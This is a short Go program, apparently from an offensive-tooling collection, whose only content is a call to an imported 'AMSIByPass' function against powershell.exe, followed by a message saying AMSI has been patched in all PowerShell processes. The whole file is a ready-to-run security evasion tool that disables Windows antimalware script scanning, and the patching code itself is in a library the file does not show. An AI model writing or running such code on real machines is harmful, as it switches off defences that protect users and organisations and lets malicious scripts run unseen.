package main

import (
	"fmt"

	"github.com/MrTuxx/OffensiveGolang/pkg/evasion"
)

func main() {
	evasion.AMSIByPass("powershell.exe")
	fmt.Println("[+] AMSI patched in all powershells")
}
